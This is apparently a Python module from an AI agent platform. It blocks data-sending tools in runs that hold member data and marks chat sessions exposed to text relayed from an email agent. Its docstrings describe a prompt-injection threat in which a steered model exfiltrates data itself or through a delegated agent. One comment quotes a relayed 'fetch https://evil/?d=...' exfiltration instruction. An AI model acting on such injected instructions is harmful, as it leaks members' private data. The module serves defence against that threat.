"""The network control on a covered run and on every run under it (H-236).

Spec ``project-docs/specs/maf_coding_engine.md`` §16.3, the owner decision
"Keep delegation" of 2026-10-03, and the prerequisite of WS-43w. Fence
WS43-F24, ``tests/unit/test_delegation_no_egress.py``.

**The threat.** A covered run of projects-assistant holds member data, in
``/workspace/.run/`` and in the model's context. The owner kept delegation,
so the run may call another agent, and that agent runs on the host with its
own tools. A model that an injection steers could send the data out itself,
or hand it to another agent and ask that agent to send it.

**The one rule, and it fails closed.** A covered run, and every run that it
delegates to at any depth, binds ``no_egress=True`` in its artifact context.
Such a run holds only:

1. the four :data:`DELEGATION_TOOLS`, because the flag travels with them;
2. the sandbox tools (``run_command``, the file tools and the skill tools),
   which say ``open_world=False`` because the container has no network;
3. tools whose risk annotation says ``open_world=False`` EXPLICITLY.

A tool with no annotation, or with no ``open_world`` key, counts as an
egress tool (:func:`is_egress_tool`). So an agent from another repo, whose
tools nobody here annotated, keeps none of them in such a run. An MCP tool,
and a tool that MAF made from an MCP server, is always an egress tool. The
writes to a shared memory store (:data:`STORE_WRITES`) are egress tools too,
because a later run can read the store.

The orchestrator decides the flag and withholds the tools at injection
(``orchestrator._tool_injection``). This module holds the rule, the reader
and the call-time refusal: :class:`EgressGuardProvider` on the MAF path, and
``permission_policy.guard_shared_agent_shell`` on the Copilot path.
"""
from __future__ import annotations

import contextlib
import sys
import threading
import weakref
from collections import OrderedDict
from collections.abc import Iterable, Mapping
from typing import Any

from acb_common import get_logger
from agent_framework import ContextProvider

from acb_skills.tool_guard import RefuseTools, WithholdTools, tool_name

_log = get_logger("acb_skills.egress")

__all__ = [
    "DELEGATION_TOOLS",
    "EGRESS_WITHHELD_ANSWER",
    "MAIL_STORE_WRITE_REFUSED",
    "MARK_CACHE_MAX",
    "MARK_CLEAR",
    "MARK_MARKED",
    "MARK_NAMESPACE",
    "MARK_TTL_S",
    "MARK_UNKNOWN",
    "MCP_LOADER_KEY",
    "NO_EGRESS_KEY",
    "STORE_WRITES",
    "UNTRUSTED_INPUT_AGENTS",
    "EgressGuardProvider",
    "RefuseEgressTools",
    "WithholdEgressTools",
    "egress_tool_names",
    "has_explicit_open_world",
    "is_delegation_tool",
    "is_egress_tool",
    "mark_untrusted_answer",
    "mark_untrusted_session",
    "no_egress_for_this_run",
    "read_untrusted_answer",
    "run_holds_mail",
    "session_is_known_marked",
    "session_is_marked",
    "session_mark_state",
    "tool_name",
]

#: The artifact-context key. ``True`` means this run holds no egress tool.
NO_EGRESS_KEY = "no_egress"
SOURCE_ID = "metorite-no-egress"

#: The tools that hand a task to another agent. The owner kept them in a
#: covered run on 2026-10-03, so they are never egress tools. The run they
#: start inherits ``no_egress`` instead.
DELEGATION_TOOLS: frozenset[str] = frozenset({
    "call_agent", "call_agents_parallel", "call_agent_background", "delegate_to_agent",
})

#: The tool writes to a store that later runs read: the four memory writes,
#: and ``save_note``, whose ``agent-data/NOTES.md`` every later session reads
#: (and, for a shared agent, every member of the organization). A run that
#: holds member data could park it there, and a later run with a send could
#: send it. Each write says ``open_world=False``, which is true of the write
#: itself, so this set names them, and a ``no_egress`` run holds none.
#:
#: This set does NOT close every delayed path, and §16.3 names the rest. The
#: run can still write its own files. The gateway's memory extraction after
#: the run is skipped for a covered run (``executor.run_was_no_egress``). A
#: task write still emits its event, and a published workflow may run on it.
STORE_WRITES: frozenset[str] = frozenset({
    "save_memory", "save_episode", "save_agent_memory", "save_org_memory", "save_note",
})

# ── An answer from an agent that reads stranger text (WS-17 EM-G11d) ────────
#
# ``email_app_master_plan.md`` §12.3.13.8. The email assistant reads mail that
# a stranger wrote. H-236 holds what it reaches DOWN (each run it delegates to
# binds ``no_egress``). Round 2 holds what it sends UP: its answer to
# ``call_agent`` can relay "fetch https://evil/?d=..." from a mail, and the
# calling run (Projects) keeps ``fetch_page``.
#
# So ``agent_tools`` frames that answer, and it marks the CHAT SESSION of the
# calling run (:func:`mark_untrusted_answer`). Round 3: the relayed URL stays in
# the thread on the next turn, and each turn is a new run, so the mark is keyed
# by the session and not by the run id. The key is the run's tenant and its
# session, each from the server-bound run context (R11), never from a request
# field. Round 4: the member is NOT in the key. In a shared room, member B's
# turn reads the URL that member A's turn relayed, so B's turn is held too. The mark lives in Redis through the tenant prefix wrapper
# (``acb_common.tenant_redis``), with :data:`MARK_TTL_S`, so every process and
# every later turn sees it. Each read that finds it slides the TTL.
#
# Readers: ``permission_policy.decide`` gives each egress call of a marked
# session the code ``untrusted_answer_confirm`` (the member's card first, a
# refusal with no card channel), and ``agent_tools`` delegates with
# ``no_egress`` from a marked session. The async readers
# (:func:`session_is_marked`) read a process cache, and on a miss they ask
# Redis. They FAIL CLOSED where a card can show: Redis that does not answer
# reads as marked. A batch session never asks Redis (round 4). The sync
# readers (:func:`read_untrusted_answer`: the Copilot guard and a sync tool)
# read only the process cache. The cache holds positives only, with a bound
# (:data:`MARK_CACHE_MAX`). A sync reader misses a mark that this process
# never saw or evicted, and §12.3.13.8 records that residual risk. Fences:
# ``tests/unit/test_delegation_no_egress.py`` and ``test_untrusted_frame.py``.

#: Agents whose context holds text that a stranger wrote. The orchestrator
#: reads the same set (``_tool_injection``), so one list names them.
UNTRUSTED_INPUT_AGENTS: frozenset[str] = frozenset({"email-assistant"})

#: The Redis namespace of the session marks (``cc:<org>:egress-mark:...``).
MARK_NAMESPACE = "egress-mark"
#: The lifetime of a mark, slid by each read that finds it. Chats have no
#: retention limit today, so this is long: 400 days of no use. Owner note in
#: ``email_app_master_plan.md`` 12.3.13.8.
MARK_TTL_S = 400 * 24 * 3600

#: The bound of the process cache of marks (round 4).
MARK_CACHE_MAX = 16384


class _PositiveLRU:
    """The sessions this process saw marked: ``(org, session)``. It holds
    positives only, and it keeps the :data:`MARK_CACHE_MAX` most recent.

    An eviction never reads as "unmarked" to an async reader: a miss there
    asks Redis, and Redis keeps the mark. Each hit moves the session to the
    end, so a session that a run uses now is the last one to go. Hold
    ``_MARKED_LOCK`` around each call."""

    def __init__(self, bound: int) -> None:
        self._bound = bound
        self._items: OrderedDict[tuple[str, str], None] = OrderedDict()

    def add(self, session: tuple[str, str]) -> None:
        self._items[session] = None
        self._items.move_to_end(session)
        while len(self._items) > self._bound:
            self._items.popitem(last=False)

    def __contains__(self, session: object) -> bool:
        if session not in self._items:
            return False
        self._items.move_to_end(session)  # type: ignore[arg-type]
        return True

    def __len__(self) -> int:
        return len(self._items)

    def clear(self) -> None:
        self._items.clear()


_MARKED_SESSIONS = _PositiveLRU(MARK_CACHE_MAX)
_MARKED_LOCK = threading.Lock()


def _session_of(ctx: Mapping[str, Any] | None = None) -> tuple[str, str] | None:
    """``(org, session)`` of the run on this frame, or None.

    The tenant is the run's bound tenant (``acb_common.db.current_tenant``),
    and the session comes from the run's bound artifact context. Neither
    comes from a request field or a tool argument. The member is not part of
    the key, because members of a shared room read one thread."""
    try:
        if ctx is None:
            from acb_skills.write_artifact import artifact_context

            ctx = artifact_context()
        from acb_common.db import current_tenant

        org = str(current_tenant() or "")
    except Exception:
        return None
    session = str((ctx or {}).get("session_id") or "")
    if not (org and session):
        return None
    return org, session


def _bound_context() -> Mapping[str, Any]:
    try:
        from acb_skills.write_artifact import artifact_context

        return artifact_context() or {}
    except Exception:
        return {}


def _minted_session(ctx: Mapping[str, Any] | None) -> bool:
    """True for a session that a BATCH run minted (H-227 ``batch_thread``).
    The executor sets the flag, never a request. No other run shares that
    session, so no other process can mark it, and Redis holds nothing."""
    return bool((ctx or {}).get("batch_thread") is True)


def _card_can_show(ctx: Mapping[str, Any] | None) -> bool:
    """True when the run can show the member's card: a member, no batch run
    and no WhatsApp run. Only such a run fails closed on a Redis fault."""
    ctx = ctx or {}
    if not ctx.get("member") or ctx.get("batch_thread") is True:
        return False
    try:
        from acb_skills.whatsapp_ui import current_run

        return current_run() is None
    except Exception:
        return True


def get_tenant_redis() -> Any:
    """The tenant Redis client. A seam, so a test passes a fake client."""
    from acb_common.tenant_redis import get_tenant_redis as _client

    return _client()


async def mark_untrusted_answer(ctx: Mapping[str, Any] | None = None) -> bool:
    """Mark the chat session of the run on this frame: it read the answer of
    an agent of :data:`UNTRUSTED_INPUT_AGENTS`. Returns False when the frame
    names no session or the write failed. The process set is marked either
    way, so this process holds the mark at once.

    *ctx* is the bound artifact context of the CALLING run, for a caller that
    has already opened the context of the run it starts. Omit it to read the
    context of this frame."""
    session = _session_of(ctx)
    if session is None:
        _log.warning("egress.untrusted_answer_unmarked")
        return False
    with _MARKED_LOCK:
        _MARKED_SESSIONS.add(session)
    if _minted_session(ctx if ctx is not None else _bound_context()):
        _log.info("egress.untrusted_answer_marked", store="process")
        return True
    org, thread = session
    try:
        from acb_common.tenant_redis import key, organization_scope

        with organization_scope(org):
            await get_tenant_redis().setex(
                key(MARK_NAMESPACE, thread), MARK_TTL_S, "1")
    except Exception as exc:  # the class only: a value never reaches a log
        _log.warning("egress.untrusted_answer_mark_failed", error=type(exc).__name__)
        return False
    _log.info("egress.untrusted_answer_marked")
    return True


async def mark_untrusted_session(
    agent_name: str | None, ctx: Mapping[str, Any] | None = None,
) -> bool:
    """THE one place that marks a session for a run of an agent that reads
    stranger text (WS-17 EM-G11f3, fix round 1).

    Each path that starts a run of an agent of :data:`UNTRUSTED_INPUT_AGENTS`
    calls it with the context of the CALLING run, BEFORE the run does any
    work: the executor's streaming sub-run (``_run_sub_agent_streaming``,
    which ``call_agent``, ``delegate_to_agent`` and each specialist tool of
    the orchestrator use) and its batch run (``_run_agent_inner``). So a
    cancel or an error in the sub-run cannot leave the session unmarked.
    ``agent_tools._answer_of`` calls it too, after the answer, as a second
    write. A run with no calling chat session (a top-level, workflow or
    scheduled run) has nothing to mark, and this returns False. Another
    agent returns False at once."""
    if str(agent_name or "") not in UNTRUSTED_INPUT_AGENTS:
        return False
    if _session_of(ctx) is None:
        return False
    return await mark_untrusted_answer(ctx)


#: The three answers of :func:`session_mark_state`.
MARK_MARKED = "marked"
MARK_CLEAR = "clear"
MARK_UNKNOWN = "unknown"

def is_delegation_tool(tool: Any) -> bool:
    """True for a tool that starts another agent's run: one of
    :data:`DELEGATION_TOOLS`, or a specialist tool of the orchestrator, which
    carries ``__delegates_to__`` (``orchestrator.agents``). A delegation is
    not an egress act by itself, because each egress tool of the run it
    starts has its own gate. So an UNKNOWN mark asks no card for it, and
    since the incident of 2026-10-18 a KNOWN mark asks none either: the run
    that it starts binds ``no_egress`` from the mark (§12.3.13.8)."""
    if getattr(tool, "__delegates_to__", None):
        return True
    return (tool if isinstance(tool, str) else tool_name(tool)) in DELEGATION_TOOLS


async def session_mark_state(
    ctx: Mapping[str, Any] | None = None, *, fail_closed: bool | None = None,
) -> str:
    """The mark of the chat session of the run on this frame.

    :data:`MARK_MARKED` when this process or Redis holds the mark,
    :data:`MARK_CLEAR` when Redis answers that it does not, and
    :data:`MARK_UNKNOWN` when Redis does not answer in a run that can show a
    card. A run that cannot show a card reads its process cache on a fault.
    A frame with no tenant or no session has nothing to key, and is clear.

    *fail_closed* overrides that choice for a fault: True reads a fault as
    unknown for every run. :func:`run_holds_mail` passes True, because a
    store write and a trace body need no card to fail closed."""
    session = _session_of(ctx)
    if session is None:
        return MARK_CLEAR
    with _MARKED_LOCK:
        if session in _MARKED_SESSIONS:
            return MARK_MARKED
    if ctx is None:
        ctx = _bound_context()
    if _minted_session(ctx):
        # A batch run minted this session, so only this process can mark it.
        return MARK_CLEAR
    org, thread = session
    try:
        from acb_common.tenant_redis import key, organization_scope

        with organization_scope(org):
            client = get_tenant_redis()
            mark = key(MARK_NAMESPACE, thread)
            if not await client.exists(mark):
                return MARK_CLEAR
            await client.expire(mark, MARK_TTL_S)
    except Exception as exc:
        unknown = _card_can_show(ctx) if fail_closed is None else bool(fail_closed)
        _log.warning("egress.untrusted_answer_read_failed",
                     error=type(exc).__name__, fail_closed=unknown)
        # Unknown only where a card can show, so the member can still
        # approve. A run with no card channel would lose each egress call.
        return MARK_UNKNOWN if unknown else MARK_CLEAR
    with _MARKED_LOCK:
        _MARKED_SESSIONS.add(session)
    return MARK_MARKED


async def session_is_marked(ctx: Mapping[str, Any] | None = None) -> bool:
    """The reader of an EGRESS TOOL gate: True when the session is marked,
    and also when the state is unknown. It FAILS CLOSED, so the call asks
    the member's card. It never removes a tool."""
    return await session_mark_state(ctx) != MARK_CLEAR


async def session_is_known_marked(ctx: Mapping[str, Any] | None = None) -> bool:
    """The reader of a DELEGATION: True only for a known mark. A Redis fault
    never binds ``no_egress`` on the run that a delegation starts, so a
    blip never holds a send. Each egress tool of that run still asks its
    card through :func:`session_is_marked`."""
    return await session_mark_state(ctx) == MARK_MARKED


async def run_holds_mail(
    agent_name: str | None, ctx: Mapping[str, Any] | None = None,
) -> bool:
    """True when the run can hold mail text (WS-17 EM-G11f3, §12.3.13.9.1).

    The one predicate of the chat memory stores. It is true when *agent_name*
    is in :data:`UNTRUSTED_INPUT_AGENTS`, or when the session's mark is not
    :data:`MARK_CLEAR`. So :data:`MARK_UNKNOWN` (a Redis fault in a run that
    can show a card) counts as true, and the predicate fails closed.

    *ctx* is the run context that the server bound: ``session_id`` and
    ``member``. Omit it to read the artifact context of this frame. The
    tenant is the bound tenant. No request field reaches this function.
    A Redis fault reads as unknown for EVERY run, with or without a member
    (fix round 1, F3: the restart sweep can fold a run with no actor).

    A run for which this is true writes no Mem0 memory and no Graphiti
    episode, keeps no ``agent_run`` trace body, and holds no tool of
    :data:`STORE_WRITES`. Fence: ``tests/unit/test_mail_copies_in_chat_stores.py``.
    """
    if str(agent_name or "") in UNTRUSTED_INPUT_AGENTS:
        return True
    return await session_mark_state(ctx, fail_closed=True) != MARK_CLEAR


#: The answer of a :data:`STORE_WRITES` tool in a run that holds mail
#: (:func:`run_holds_mail`). The tool gate gives it at once and asks no card,
#: because a hidden store is not a copy that the member can see or delete.
MAIL_STORE_WRITE_REFUSED = (
    "{tool} did not run. This chat holds text from email, and Metorite keeps "
    "no copy of email in a memory store or a note. Answer with what you have."
)


def read_untrusted_answer(ctx: Mapping[str, Any] | None = None) -> bool:
    """The sync reader: True when this process saw the session of the run on
    this frame marked. The Copilot guard and a sync tool read it, because
    they cannot wait for Redis."""
    session = _session_of(ctx)
    if session is None:
        return False
    with _MARKED_LOCK:
        return session in _MARKED_SESSIONS

#: The answer to a call that the control refuses. It names what is true of
#: this run and claims nothing about the whole platform.
EGRESS_WITHHELD_ANSWER = (
    "{name} is off in this run. This run works with member data from a "
    "sandboxed turn, so it may not use a tool that can send data off the "
    "platform. Read and compute with your other tools."
)


def _mcp_classes() -> tuple[type, ...]:
    try:
        from agent_framework import MCPStdioTool, MCPStreamableHTTPTool, MCPWebsocketTool
    except ImportError:  # pragma: no cover — MAF ships all three
        return ()
    return (MCPStdioTool, MCPStreamableHTTPTool, MCPWebsocketTool)


#: The key that marks a loader tool of an MCP server (WS-8c item 26). MAF
#: builds the three loaders of progressive disclosure (``<prefix>_list_mcp_tools``,
#: ``_load_tool`` and ``_unload_tool``) with no ``_mcp_is_tool`` key, so the
#: orchestrator marks each one with this key (``orchestrator._maf_mcp``). The
#: key is Metorite's own, so the loops of MAF that read ``_mcp_is_tool`` do not
#: change. Fence: ``tests/unit/test_maf_mcp_budget.py``.
MCP_LOADER_KEY = "_acb_mcp_loader"


def _from_mcp(item: Any) -> bool:
    """A MAF MCP tool, a FunctionTool that MAF made from an MCP server, or a
    loader tool of an MCP server (:data:`MCP_LOADER_KEY`)."""
    if isinstance(item, _mcp_classes()):
        return True
    props = getattr(item, "additional_properties", None)
    return isinstance(props, Mapping) and (
        bool(props.get("_mcp_is_tool")) or props.get(MCP_LOADER_KEY) is True)


#: The platform's own tool callables, by IDENTITY, and the tool names each one
#: may carry (H-236 follow-up). The orchestrator registers what it injects
#: (``_tool_injection._collect_injectable_platform_tools``), the workflow and
#: app tools, and the sandbox registers its tools (``sandbox_tools``). A
#: wrapper is trusted only when OUR code made it from a trusted callable
#: (:func:`_register_platform_wrapper`). Nothing follows ``__wrapped__``, so a
#: tool of another repo made with ``functools.wraps(<a platform tool>)`` is not
#: trusted. Weak keys, so a per-run closure leaves with its run.
_PLATFORM_CALLABLES: weakref.WeakKeyDictionary[Any, frozenset[str]] = (
    weakref.WeakKeyDictionary()
)


#: The packages whose code may register a platform callable. A guard against
#: a mistake, not a security boundary: code that runs in this process can
#: forge its module name. It stops an author who calls the registry from an
#: agent repo, a skill or a test helper by accident.
_PLATFORM_PACKAGES: tuple[str, ...] = ("acb_skills", "orchestrator")


def _caller_is_platform(depth: int = 2) -> bool:
    """True when the caller *depth* frames up lives in a platform package."""
    try:
        module = str(sys._getframe(depth).f_globals.get("__name__", "") or "")
    except ValueError:  # the stack is not that deep
        return False
    return any(module == p or module.startswith(p + ".") for p in _PLATFORM_PACKAGES)


def _register_platform_callable(fn: Any, name: str | None = None) -> Any:
    """Record *fn* as a platform tool that may carry *name* (its own name by
    default). Returns *fn*. Never raises.

    Only code in :data:`_PLATFORM_PACKAGES` may call it. A call from any other
    module registers nothing and logs ``egress.register_refused``.
    """
    if not _caller_is_platform():
        _log.warning("egress.register_refused", tool=str(name or getattr(fn, "__name__", "")))
        return fn
    tool = str(name or getattr(fn, "__name__", "") or "")
    if not tool:
        return fn
    with contextlib.suppress(TypeError):  # an object that takes no weak reference
        _PLATFORM_CALLABLES[fn] = _PLATFORM_CALLABLES.get(fn, frozenset()) | {tool}
    return fn


def _register_platform_wrapper(original: Any, wrapper: Any) -> Any:
    """Trust *wrapper* exactly as far as *original* is trusted. Returns it.

    Our own wrappers call this: the permission gate, the steer wrap of a
    sandbox tool. A wrapper that another repo made does not, so it stays
    untrusted whatever it wraps. A call from outside
    :data:`_PLATFORM_PACKAGES` registers nothing.
    """
    if not _caller_is_platform():
        _log.warning("egress.register_refused", tool=str(getattr(wrapper, "__name__", "")))
        return wrapper
    try:
        names = _PLATFORM_CALLABLES.get(original)
    except TypeError:
        names = None
    if names:
        with contextlib.suppress(TypeError):
            _PLATFORM_CALLABLES[wrapper] = _PLATFORM_CALLABLES.get(wrapper, frozenset()) | names
    return wrapper


def _platform_owned(item: Any, name: str) -> bool:
    """True when the tool object *item*, called *name*, is the platform's own.

    Identity (H-236 follow-up): the callable under *item* (``item.func``, or
    *item* itself) is one that the platform registered for that name. A tool
    of another repo that borrows a platform name, or wraps a platform tool
    with ``functools.wraps``, fails this test.
    """
    fn = getattr(item, "func", item)
    try:
        names = _PLATFORM_CALLABLES.get(fn)
    except TypeError:
        return False
    return bool(names) and name in names


def _risk_of(item: Any, name: str) -> Mapping[str, Any] | None:
    """The annotation of a tool object, or of a bare name when *item* is None.

    For a tool OBJECT it fails closed. An agent's own tool carries its
    annotation on the function (``annotate`` sets ``__tool_risk__``). A
    registry entry that the platform made is trusted only when the object is
    the platform's own callable (:func:`_platform_owned`). Every other object
    reads as unannotated, so another repo's tool that shares a name with one
    of ours is an egress tool.

    A bare name reads the registry. Only a caller that resolved the object
    first may trust that answer: the Copilot guard resolves the name in the
    session's own tool list (``permission_policy.is_egress_request``).
    """
    from acb_skills.tool_annotations import _AGENT_OWN, TOOL_ANNOTATIONS

    if item is None:
        return TOOL_ANNOTATIONS.get(name)
    for obj in (item, getattr(item, "func", None)):
        hints = getattr(obj, "__tool_risk__", None)
        if isinstance(hints, Mapping):
            return hints
    if name in _AGENT_OWN or not _platform_owned(item, name):
        return None
    return TOOL_ANNOTATIONS.get(name)


def has_explicit_open_world(item: Any) -> bool:
    """True when *item* carries an ``open_world`` value, True or False."""
    hints = _risk_of(None, item) if isinstance(item, str) else _risk_of(item, tool_name(item))
    return isinstance(hints, Mapping) and isinstance(hints.get("open_world"), bool)


def is_egress_tool(item: Any) -> bool:
    """True unless *item* may stay in a ``no_egress`` run (H-236). Fails closed.

    *item* is a tool object, a plain function, a dict spec or a bare name. A
    delegation tool may stay, but only the platform's own: a tool of another
    repo that borrows a delegation name is judged like any other tool. An MCP
    tool, a store write, and a tool with no explicit ``open_world=False`` may
    not stay. A bare name reads the registry, so only a caller that resolved
    the tool object first may pass one (the Copilot guard does).
    """
    if not isinstance(item, str) and _from_mcp(item):
        return True
    name = item if isinstance(item, str) else tool_name(item)
    if name in DELEGATION_TOOLS and (isinstance(item, str) or _platform_owned(item, name)):
        return False
    if not name or name in STORE_WRITES:
        return True
    hints = _risk_of(None if isinstance(item, str) else item, name)
    return not (isinstance(hints, Mapping) and hints.get("open_world") is False)


def egress_tool_names(tools: Iterable[Any]) -> frozenset[str]:
    """The names of the egress tools among *tools*."""
    return frozenset(t if isinstance(t, str) else tool_name(t)
                     for t in tools if is_egress_tool(t))


def no_egress_for_this_run() -> bool:
    """True when the run on this frame may not send data off the platform.

    THE reader. It fails closed: a frame with no run context reads as
    ``no_egress``, and so does any value but an explicit ``False``. Only a
    bound run whose context says ``no_egress=False``, or has no such key,
    reads as open. Each run boundary of the executor binds the key.
    """
    try:
        from acb_skills.write_artifact import artifact_context

        ctx = artifact_context()
    except Exception:
        return True
    if not ctx:
        return True
    return ctx.get(NO_EGRESS_KEY, False) is not False


def _egress_answer(name: str) -> str:
    _log.info("egress.call_refused", tool=name)
    return EGRESS_WITHHELD_ANSWER.format(name=name)


class WithholdEgressTools(WithholdTools):
    """Takes every egress tool out of each model request of ONE run.

    Injection already left them out. This catches a tool that joined the run
    later, for example a sandbox provider's tool or an MCP server's tool.
    """

    def __init__(self) -> None:
        super().__init__(is_egress_tool)


class RefuseEgressTools(RefuseTools):
    """Refuses a call to an egress tool, in case the model names one."""

    def __init__(self) -> None:
        super().__init__(is_egress_tool, _egress_answer)


class EgressGuardProvider(ContextProvider):
    """Adds the two middlewares above to ONE run of a native MAF agent.

    ``_tool_injection._inject_agent_tools`` attaches it to the run's own view
    of the agent (``agent_with_providers``), never to a shared agent object.
    """

    def __init__(self) -> None:
        super().__init__(SOURCE_ID)

    async def before_run(
        self, *, agent: Any, session: Any, context: Any, state: dict[str, Any],
    ) -> None:
        context.extend_middleware(SOURCE_ID, [WithholdEgressTools(), RefuseEgressTools()])
